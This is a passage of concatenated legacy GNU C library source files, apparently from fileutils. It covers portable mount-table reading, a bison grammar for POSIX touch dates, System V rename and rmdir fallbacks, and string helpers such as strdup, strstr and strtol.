#    define MOUNTED MNTTABNAME
#  endif
#endif
#endif

#ifdef MOUNTED_GETMNTINFO	/* 4.4BSD.  */
#include <sys/mount.h>
#endif

#ifdef MOUNTED_GETMNT		/* Ultrix.  */
#include <sys/mount.h>
#include <sys/fs_types.h>
#endif

#ifdef MOUNTED_FREAD		/* SVR2.  */
#include <mnttab.h>
#endif

#ifdef MOUNTED_FREAD_FSTYP	/* SVR3.  */
#include <mnttab.h>
#include <sys/fstyp.h>
#include <sys/statfs.h>
#endif

#ifdef MOUNTED_LISTMNTENT
#include <mntent.h>
#endif

#ifdef MOUNTED_GETMNTENT2	/* SVR4.  */
#include <sys/mnttab.h>
#endif

#ifdef MOUNTED_VMOUNT		/* AIX.  */
#include <fshelp.h>
#include <sys/vfs.h>
#endif

#ifdef DOLPHIN
/* So special that it's not worth putting this in autoconf.  */
#undef MOUNTED_FREAD_FSTYP
#define MOUNTED_GETMNTTBL
#endif

#ifdef MOUNTED_GETMNTENT1	/* 4.3BSD, SunOS, HP-UX, Dynix, Irix.  */
/* Return the value of the hexadecimal number represented by CP.
   No prefix (like '0x') or suffix (like 'h') is expected to be
   part of CP. */

static int
xatoi (cp)
     char *cp;
{
  int val;

  val = 0;
  while (*cp)
    {
      if (*cp >= 'a' && *cp <= 'f')
	val = val * 16 + *cp - 'a' + 10;
      else if (*cp >= 'A' && *cp <= 'F')
	val = val * 16 + *cp - 'A' + 10;
      else if (*cp >= '0' && *cp <= '9')
	val = val * 16 + *cp - '0';
      else
	break;
      cp++;
    }
  return val;
}
#endif /* MOUNTED_GETMNTENT1.  */

#if defined (MOUNTED_GETMNTINFO) && !defined (__NetBSD__)
static char *
fstype_to_string (t)
     short t;
{
  switch (t)
    {
    case MOUNT_UFS:
      return "ufs";
    case MOUNT_NFS:
      return "nfs";
#ifdef MOUNT_PC
    case MOUNT_PC:
      return "pc";
#endif
#ifdef MOUNT_MFS
    case MOUNT_MFS:
      return "mfs";
#endif
#ifdef MOUNT_LO
    case MOUNT_LO:
      return "lo";
#endif
#ifdef MOUNT_TFS
    case MOUNT_TFS:
      return "tfs";
#endif
#ifdef MOUNT_TMP
    case MOUNT_TMP:
      return "tmp";
#endif
    default:
      return "?";
    }
}
#endif /* MOUNTED_GETMNTINFO */

#ifdef MOUNTED_VMOUNT		/* AIX.  */
static char *
fstype_to_string (t)
     int t;
{
  struct vfs_ent *e;

  e = getvfsbytype (t);
  if (!e || !e->vfsent_name)
    return "none";
  else
    return e->vfsent_name;
}
#endif /* MOUNTED_VMOUNT */

/* Return a list of the currently mounted filesystems, or NULL on error.
   Add each entry to the tail of the list so that they stay in order.
   If NEED_FS_TYPE is nonzero, ensure that the filesystem type fields in
   the returned list are valid.  Otherwise, they might not be.
   If ALL_FS is zero, do not return entries for filesystems that
   are automounter (dummy) entries.  */

struct mount_entry *
read_filesystem_list (need_fs_type, all_fs)
     int need_fs_type, all_fs;
{
  struct mount_entry *mount_list;
  struct mount_entry *me;
  struct mount_entry *mtail;

  /* Start the list off with a dummy entry. */
  me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
  me->me_next = NULL;
  mount_list = mtail = me;

#ifdef MOUNTED_LISTMNTENT
  {
    struct tabmntent *mntlist, *p;
    struct mntent *mnt;
    struct mount_entry *me;
    
    /* the third and fourth arguments could be used to filter mounts,
       but Crays doesn't seem to have any mounts that we want to
       remove. Specifically, automount create normal NFS mounts.
       */

    if(listmntent(&mntlist, KMTAB, NULL, NULL) < 0)
      return NULL;
    p = mntlist;
    while(p){
      mnt = p->ment;
      me = (struct mount_entry*) xmalloc(sizeof (struct mount_entry));
      me->me_devname = xstrdup(mnt->mnt_fsname);
      me->me_mountdir = xstrdup(mnt->mnt_dir);
      me->me_type = xstrdup(mnt->mnt_type);
      me->me_dev = -1;
      me->me_next = NULL;
      mtail->me_next = me;
      mtail = me;
      p = p->next;
    }
    freemntlist(mntlist);
  }
#endif

#ifdef MOUNTED_GETMNTENT1	/* 4.3BSD, SunOS, HP-UX, Dynix, Irix.  */
  {
    struct mntent *mnt;
    char *table = MOUNTED;
    FILE *fp;
    char *devopt;

    fp = setmntent (table, "r");
    if (fp == NULL)
      return NULL;

    while ((mnt = getmntent (fp)))
      {
	if (!all_fs && (!strcmp (mnt->mnt_type, "ignore")
			|| !strcmp (mnt->mnt_type, "auto")))
	  continue;

	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup (mnt->mnt_fsname);
	me->me_mountdir = xstrdup (mnt->mnt_dir);
	me->me_type = xstrdup (mnt->mnt_type);
	devopt = strstr (mnt->mnt_opts, "dev=");
	if (devopt)
	  {
	    if (devopt[4] == '0' && (devopt[5] == 'x' || devopt[5] == 'X'))
	      me->me_dev = xatoi (devopt + 6);
	    else
	      me->me_dev = xatoi (devopt + 4);
	  }
	else
	  me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }

    if (endmntent (fp) == 0)
      return NULL;
  }
#endif /* MOUNTED_GETMNTENT1. */

#ifdef MOUNTED_GETMNTINFO	/* 4.4BSD.  */
  {
    struct statfs *fsp;
    int entries;

    entries = getmntinfo (&fsp, MNT_NOWAIT);
    if (entries < 0)
      return NULL;
    while (entries-- > 0)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup (fsp->f_mntfromname);
	me->me_mountdir = xstrdup (fsp->f_mntonname);
#ifdef __NetBSD__
	me->me_type = xstrdup (fsp->f_fstypename);
#else
	me->me_type = fstype_to_string (fsp->f_type);
#endif
	me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
	fsp++;
      }
  }
#endif /* MOUNTED_GETMNTINFO */

#ifdef MOUNTED_GETMNT		/* Ultrix.  */
  {
    int offset = 0;
    int val;
    struct fs_data fsd;

    while ((val = getmnt (&offset, &fsd, sizeof (fsd), NOSTAT_MANY,
			  (char *) 0)) > 0)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup (fsd.fd_req.devname);
	me->me_mountdir = xstrdup (fsd.fd_req.path);
	me->me_type = gt_names[fsd.fd_req.fstype];
	me->me_dev = fsd.fd_req.dev;
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }
    if (val < 0)
      return NULL;
  }
#endif /* MOUNTED_GETMNT. */

#if defined (MOUNTED_GETFSSTAT)	/* __alpha running OSF_1 */
  {
    int numsys, counter, bufsize;
    struct statfs *stats;

    numsys = getfsstat ((struct statfs *)0, 0L, MNT_WAIT);
    if (numsys < 0)
      return (NULL);

    bufsize = (1 + numsys) * sizeof (struct statfs);
    stats = (struct statfs *)xmalloc (bufsize);
    numsys = getfsstat (stats, bufsize, MNT_WAIT);

    if (numsys < 0)
      {
	free (stats);
	return (NULL);
      }

    for (counter = 0; counter < numsys; counter++)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup (stats[counter].f_mntfromname);
	me->me_mountdir = xstrdup (stats[counter].f_mntonname);
	me->me_type = mnt_names[stats[counter].f_type];
	me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }

    free (stats);
  }
#endif /* MOUNTED_GETFSSTAT */

#if defined (MOUNTED_FREAD) || defined (MOUNTED_FREAD_FSTYP) /* SVR[23].  */
  {
    struct mnttab mnt;
    char *table = "/etc/mnttab";
    FILE *fp;

    fp = fopen (table, "r");
    if (fp == NULL)
      return NULL;

    while (fread (&mnt, sizeof mnt, 1, fp) > 0)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
#ifdef GETFSTYP			/* SVR3.  */
	me->me_devname = xstrdup (mnt.mt_dev);
#else
	me->me_devname = xmalloc (strlen (mnt.mt_dev) + 6);
	strcpy (me->me_devname, "/dev/");
	strcpy (me->me_devname + 5, mnt.mt_dev);
#endif
	me->me_mountdir = xstrdup (mnt.mt_filsys);
	me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_type = "";
#ifdef GETFSTYP			/* SVR3.  */
	if (need_fs_type)
	  {
	    struct statfs fsd;
	    char typebuf[FSTYPSZ];

	    if (statfs (me->me_mountdir, &fsd, sizeof fsd, 0) != -1
		&& sysfs (GETFSTYP, fsd.f_fstyp, typebuf) != -1)
	      me->me_type = xstrdup (typebuf);
	  }
#endif
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }

    if (fclose (fp) == EOF)
      return NULL;
  }
#endif /* MOUNTED_FREAD || MOUNTED_FREAD_FSTYP.  */

#ifdef MOUNTED_GETMNTTBL	/* DolphinOS goes it's own way */
  {
    struct mntent **mnttbl=getmnttbl(),**ent;
    for (ent=mnttbl;*ent;ent++)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup ( (*ent)->mt_resource);
	me->me_mountdir = xstrdup( (*ent)->mt_directory);
	me->me_type =  xstrdup ((*ent)->mt_fstype);
	me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }
    endmnttbl();
  }
#endif

#ifdef MOUNTED_GETMNTENT2	/* SVR4.  */
  {
    struct mnttab mnt;
    char *table = MNTTAB;
    FILE *fp;
    int ret;

    fp = fopen (table, "r");
    if (fp == NULL)
      return NULL;

    while ((ret = getmntent (fp, &mnt)) == 0)
      {
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	me->me_devname = xstrdup (mnt.mnt_special);
	me->me_mountdir = xstrdup (mnt.mnt_mountp);
	me->me_type = xstrdup (mnt.mnt_fstype);
	me->me_dev = (dev_t) -1;	/* Magic; means not known yet. */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }

    if (ret > 0)
      return NULL;
   if (fclose (fp) == EOF)
      return NULL;
  }
#endif /* MOUNTED_GETMNTENT2.  */

#ifdef MOUNTED_VMOUNT		/* AIX.  */
  {
    int bufsize;
    char *entries, *thisent;
    struct vmount *vmp;

    /* Ask how many bytes to allocate for the mounted filesystem info.  */
    mntctl (MCTL_QUERY, sizeof bufsize, (struct vmount *) &bufsize);
    entries = xmalloc (bufsize);

    /* Get the list of mounted filesystems.  */
    mntctl (MCTL_QUERY, bufsize, (struct vmount *) entries);

    for (thisent = entries; thisent < entries + bufsize;
	 thisent += vmp->vmt_length)
      {
	vmp = (struct vmount *) thisent;
	me = (struct mount_entry *) xmalloc (sizeof (struct mount_entry));
	if (vmp->vmt_flags & MNT_REMOTE)
	  {
	    char *host, *path;

	    /* Prepend the remote pathname.  */
	    host = thisent + vmp->vmt_data[VMT_HOSTNAME].vmt_off;
	    path = thisent + vmp->vmt_data[VMT_OBJECT].vmt_off;
	    me->me_devname = xmalloc (strlen (host) + strlen (path) + 2);
	    strcpy (me->me_devname, host);
	    strcat (me->me_devname, ":");
	    strcat (me->me_devname, path);
	  }
	else
	  {
	    me->me_devname = xstrdup (thisent +
				      vmp->vmt_data[VMT_OBJECT].vmt_off);
	  }
	me->me_mountdir = xstrdup (thisent + vmp->vmt_data[VMT_STUB].vmt_off);
	me->me_type = xstrdup (fstype_to_string (vmp->vmt_gfstype));
	me->me_dev = (dev_t) -1; /* vmt_fsid might be the info we want.  */
	me->me_next = NULL;

	/* Add to the linked list. */
	mtail->me_next = me;
	mtail = me;
      }
    free (entries);
  }
#endif /* MOUNTED_VMOUNT. */

  /* Free the dummy head. */
  me = mount_list;
  mount_list = mount_list->me_next;
  free (me);
  return mount_list;
}
/* Parse dates for touch.
   Copyright (C) 1989, 1990, 1991 Free Software Foundation Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Jim Kingdon and David MacKenzie. */
%{

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* The following block of alloca-related preprocessor directives is here
   solely to allow compilation by non GNU-C compilers of the C parser
   produced from this file by old versions of bison.  Newer versions of
   bison include a block similar to this one in bison.simple.  */
   
#ifdef __GNUC__
#define alloca __builtin_alloca
#else
#ifdef HAVE_ALLOCA_H
#include <alloca.h>
#else
#ifdef _AIX
 #pragma alloca
#else
void *alloca ();
#endif
#endif
#endif

#include <stdio.h>
#include <sys/types.h>

#ifdef TM_IN_SYS_TIME
#include <sys/time.h>
#else
#include <time.h>
#endif

/* Some old versions of bison generate parsers that use bcopy.
   That loses on systems that don't provide the function, so we have
   to redefine it here.  */
#if !defined (HAVE_BCOPY) && defined (HAVE_MEMCPY) && !defined (bcopy)
#define bcopy(from, to, len) memcpy ((to), (from), (len))
#endif

#define YYDEBUG 1

/* Lexical analyzer's current scan position in the input string. */
static char *curpos;

/* The return value. */
static struct tm t;

time_t mktime ();

#define yyparse posixtime_yyparse
static int yylex ();
static int yyerror ();
%}

%token DIGIT

%%
date :
       digitpair /* month */
       digitpair /* day */
       digitpair /* hours */
       digitpair /* minutes */
       year
       seconds {
	         if ($1 >= 1 && $1 <= 12)
		   t.tm_mon = $1 - 1;
		 else {
		   YYABORT;
		 }
		 if ($2 >= 1 && $2 <= 31)
		   t.tm_mday = $2;
		 else {
		   YYABORT;
		 }
		 if ($3 >= 0 && $3 <= 23)
		   t.tm_hour = $3;
		 else {
		   YYABORT;
		 }
		 if ($4 >= 0 && $4 <= 59)
		   t.tm_min = $4;
		 else {
		   YYABORT;
		 }
	       }

year : digitpair {
                   t.tm_year = $1;
		   /* Deduce the century based on the year.
		      See POSIX.2 section 4.63.3.  */
		   if ($1 <= 68)
		     t.tm_year += 100;
		 }
    | digitpair digitpair {
                            t.tm_year = $1 * 100 + $2;
			    if (t.tm_year < 1900) {
			      YYABORT;
			    } else
			      t.tm_year -= 1900;
			  }
    | /* empty */ {
                    time_t now;
		    struct tm *tmp;

                    /* Use current year.  */
                    time (&now);
		    tmp = localtime (&now);
		    t.tm_year = tmp->tm_year;
		  }
    ;

seconds : /* empty */ {
                        t.tm_sec = 0;
		      }
        | '.' digitpair {
	                  if ($2 >= 0 && $2 <= 61)
			    t.tm_sec = $2;
			  else {
			    YYABORT;
			  }
			}
        ;

digitpair : DIGIT DIGIT {
                          $$ = $1 * 10 + $2;
			}
          ;
%%
static int
yylex ()
{
  char ch = *curpos++;

  if (ch >= '0' && ch <= '9')
    {
      yylval = ch - '0';
      return DIGIT;
    }
  else if (ch == '.' || ch == 0)
    return ch;
  else
    return '?';			/* Cause an error.  */
}

static int
yyerror ()
{
  return 0;
}

/* Parse a POSIX-style date and return it, or (time_t)-1 for an error.  */

time_t
posixtime (s)
     char *s;
{
  curpos = s;
  /* Let mktime decide whether it is daylight savings time.  */
  t.tm_isdst = -1;
  if (yyparse ())
    return (time_t)-1;
  else
    return mktime (&t);
}

/* Parse a POSIX-style date and return it, or NULL for an error.  */

struct tm *
posixtm (s)
     char *s;
{
  if (posixtime (s) == -1)
    return NULL;
  return &t;
}
/* rename.c -- BSD compatible directory function for System V
   Copyright (C) 1988, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* Rename file FROM to file TO.
   Return 0 if successful, -1 if not. */

int
rename (from, to)
     char *from;
     char *to;
{
  struct stat from_stats, to_stats;
  int pid, status;

  if (stat (from, &from_stats))
    return -1;

  /* Be careful not to unlink `from' if it happens to be equal to `to' or
     (on filesystems that silently truncate filenames after 14 characters)
     if `from' and `to' share the significant characters. */
  if (stat (to, &to_stats))
    {
      if (errno != ENOENT)
        return -1;
    }
  else
    {
      if ((from_stats.st_dev == to_stats.st_dev)
          && (from_stats.st_ino == to_stats.st_ino))
        /* `from' and `to' designate the same file on that filesystem. */
        return 0;

      if (unlink (to) && errno != ENOENT)
        return -1;
    }

  if (S_ISDIR (from_stats.st_mode))
    {
      /* Need a setuid root process to link and unlink directories. */
      pid = fork ();
      switch (pid)
	{
	case -1:		/* Error. */
	  error (1, errno, "cannot fork");

	case 0:			/* Child. */
	  execl (MVDIR, "mvdir", from, to, (char *) 0);
	  error (255, errno, "cannot run `%s'", MVDIR);

	default:		/* Parent. */
	  while (wait (&status) != pid)
	    /* Do nothing. */ ;

	  errno = 0;		/* mvdir printed the system error message. */
	  if (status)
	    return -1;
	}
    }
  else
    {
      if (link (from, to))
	return -1;
      if (unlink (from) && errno != ENOENT)
	{
	  unlink (to);
	  return -1;
	}
    }
  return 0;
}
/* rmdir.c -- BSD compatible remove directory function for System V
   Copyright (C) 1988, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* rmdir adapted from GNU tar.  */

/* Remove directory DPATH.
   Return 0 if successful, -1 if not.  */

int
rmdir (dpath)
     char *dpath;
{
  int cpid, status;
  struct stat statbuf;

  if (stat (dpath, &statbuf) != 0)
    return -1;			/* errno already set */

  if (!S_ISDIR (statbuf.st_mode))
    {
      errno = ENOTDIR;
      return -1;
    }

  cpid = fork ();
  switch (cpid)
    {
    case -1:			/* cannot fork */
      return -1;		/* errno already set */

    case 0:			/* child process */
      execl ("/bin/rmdir", "rmdir", dpath, (char *) 0);
      _exit (1);

    default:			/* parent process */

      /* Wait for kid to finish.  */

      while (wait (&status) != cpid)
	/* Do nothing.  */ ;

      if (status & 0xFFFF)
	{

	  /* /bin/rmdir failed.  */

	  errno = EIO;
	  return -1;
	}
      return 0;
    }
}
/* stpcpy.c -- copy a string and return pointer to end of new string
    Copyright (C) 1989, 1990 Free Software Foundation.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2, or (at your option)
    any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* Copy SRC to DEST, returning the address of the terminating '\0' in DEST.  */

char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
/* Copyright (C) 1991, 1992 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <string.h>
#include <ctype.h>

/* Compare S1 and S2, ignoring case, returning less than, equal to or
   greater than zero if S1 is lexiographically less than,
   equal to or greater than S2.  */
int
strcasecmp (s1, s2)
     const char *s1;
     const char *s2;
{
  register const unsigned char *p1 = (const unsigned char *) s1;
  register const unsigned char *p2 = (const unsigned char *) s2;
  unsigned char c1, c2;

  if (p1 == p2)
    return 0;

  do
    {
      c1 = tolower (*p1++);
      c2 = tolower (*p2++);
      if (c1 == '\0')
	break;
    }
  while (c1 == c2);

  return c1 - c2;
}
/* strdup.c -- return a newly allocated copy of a string
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef STDC_HEADERS
#include <string.h>
#include <stdlib.h>
#else
char *malloc ();
char *strcpy ();
#endif

/* Return a newly allocated copy of STR,
   or 0 if out of memory. */

char *
strdup (str)
     const char *str;
{
  char *newstr;

  newstr = (char *) malloc (strlen (str) + 1);
  if (newstr)
    strcpy (newstr, str);
  return newstr;
}
/* Copyright (C) 1996 Free Software Foundation, Inc.

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include <stdio.h>
#include <sys/types.h>

#ifdef STDC_HEADERS
# include <string.h>
# include <stdlib.h>
#else
char *malloc ();
#endif

/* Duplicate S, returning an identical malloc'd string.  */
char *
strndup (s, n)
     const char *s;
     size_t n;
{
  char *new = malloc (n + 1);

  if (new == NULL)
    return NULL;

  memcpy (new, s, n);
  new[n] = '\0';

  return new;
}
/* strstr.c -- return the offset of one string within another
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Mike Rendell <michael@cs.mun.ca>.  */

/* Return the starting address of string S2 in S1;
   return 0 if it is not found. */

char *
strstr (s1, s2)
     char *s1;
     char *s2;
{
  int i;
  char *p1;
  char *p2;
  char *s = s1;

  for (p2 = s2, i = 0; *s; p2 = s2, i++, s++)
    {
      for (p1 = s; *p1 && *p2 && *p1 == *p2; p1++, p2++)
	;
      if (!*p2)
	break;
    }
  if (!*p2)
    return s1 + i;

  return 0;
}
/* Copyright (C) 1991, 92, 94, 95, 96 Free Software Foundation, Inc.

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307,
USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#ifdef _LIBC
# define USE_NUMBER_GROUPING
# define STDC_HEADERS
# define HAVE_LIMITS_H
#endif

#include <ctype.h>
#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef HAVE_LIMITS_H
# include <limits.h>
#endif

#ifdef STDC_HEADERS
# include <stddef.h>
# include <stdlib.h>
#else
# ifndef NULL
#  define NULL 0
# endif
#endif

#ifdef USE_NUMBER_GROUPING
# include "../locale/localeinfo.h"
#endif

/* Nonzero if we are defining `strtoul' or `strtouq', operating on
   unsigned integers.  */
#ifndef UNSIGNED
# define UNSIGNED 0
# define INT LONG int
#else
# define INT unsigned LONG int
#endif

/* Determine the name.  */
#if UNSIGNED
# ifdef USE_WIDE_CHAR
#  ifdef QUAD
#   define strtol wcstouq
#  else
#   define strtol wcstoul
#  endif
# else
#  ifdef QUAD
#   define strtol strtouq
#  else
#   define strtol strtoul
#  endif
# endif
#else
# ifdef USE_WIDE_CHAR
#  ifdef QUAD
#   define strtol wcstoq
#  else
#   define strtol wcstol
#  endif
# else
#  ifdef QUAD
#   define strtol strtoq
#  endif
# endif
#endif

/* If QUAD is defined, we are defining `strtoq' or `strtouq',
   operating on `long long int's.  */
#ifdef QUAD
# define LONG long long
# undef LONG_MIN
# define LONG_MIN LONG_LONG_MIN
# undef LONG_MAX
# define LONG_MAX LONG_LONG_MAX
# undef ULONG_MAX
# define ULONG_MAX ULONG_LONG_MAX
# if __GNUC__ == 2 && __GNUC_MINOR__ < 7
   /* Work around gcc bug with using this constant.  */
   static const unsigned long long int maxquad = ULONG_LONG_MAX;
#  undef ULONG_MAX
#  define ULONG_MAX maxquad
# endif
#else
# define LONG long

#ifndef ULONG_MAX
# define ULONG_MAX ((unsigned long) ~(unsigned long) 0)
#endif
#ifndef LONG_MAX
# define LONG_MAX ((long int) (ULONG_MAX >> 1))
#endif
#endif

#ifdef USE_WIDE_CHAR
# include <wchar.h>
# include <wctype.h>
# define L_(ch) L##ch
# define UCHAR_TYPE wint_t
# define STRING_TYPE wchar_t
# define ISSPACE(ch) iswspace (ch)
# define ISALPHA(ch) iswalpha (ch)
# define TOUPPER(ch) towupper (ch)
#else
# define L_(ch) ch
# define UCHAR_TYPE unsigned char
# define STRING_TYPE char
# define ISSPACE(ch) isspace (ch)
# define ISALPHA(ch) isalpha (ch)
# define TOUPPER(ch) toupper (ch)
#endif

#ifdef __STDC__
# define INTERNAL(x) INTERNAL1(x)
# define INTERNAL1(x) __##x##_internal
# define WEAKNAME(x) WEAKNAME1(x)
# define WEAKNAME1(x) __##x
#else
# define INTERNAL(x) __/**/x/**/_internal
# define WEAKNAME(x) __/**/x
#endif

#ifdef USE_NUMBER_GROUPING
/* This file defines a function to check for correct grouping.  */
# include "grouping.h"
#endif


/* Convert NPTR to an `unsigned long int' or `long int' in base BASE.
   If BASE is 0 the base is determined by the presence of a leading
   zero, indicating octal or a leading "0x" or "0X", indicating hexadecimal.
   If BASE is < 2 or > 36, it is reset to 10.
   If ENDPTR is not NULL, a pointer to the character after the last
   one converted is stored in *ENDPTR.  */

INT
INTERNAL (strtol) (nptr, endptr, base, group)
     const STRING_TYPE *nptr;
     STRING_TYPE **endptr;
     int base;
     int group;
{
  int negative;
  register unsigned LONG int cutoff;
  register unsigned int cutlim;
  register unsigned LONG int i;
  register const STRING_TYPE *s;
  register UCHAR_TYPE c;
  const STRING_TYPE *save, *end;
  int overflow;

#ifdef USE_NUMBER_GROUPING
  /* The thousands character of the current locale.  */
  wchar_t thousands;
  /* The numeric grouping specification of the current locale,
     in the format described in <locale.h>.  */
  const char *grouping;

  if (group)
    {
      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);
      if (*grouping <= 0 || *grouping == CHAR_MAX)
	grouping = NULL;
      else
	{
	  /* Figure out the thousands separator character.  */
	  if (mbtowc (&thousands, _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP),
		      strlen (_NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP))) <= 0)
	    thousands = (wchar_t) *_NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);
	  if (thousands == L'\0')
	    grouping = NULL;
	}
    }
  else
    grouping = NULL;
#endif

  if (base < 0 || base == 1 || base > 36)
    base = 10;

  save = s = nptr;

  /* Skip white space.  */
  while (ISSPACE (*s))
    ++s;
  if (*s == L_('\0'))
    goto noconv;

  /* Check for a sign.  */
  if (*s == L_('-'))
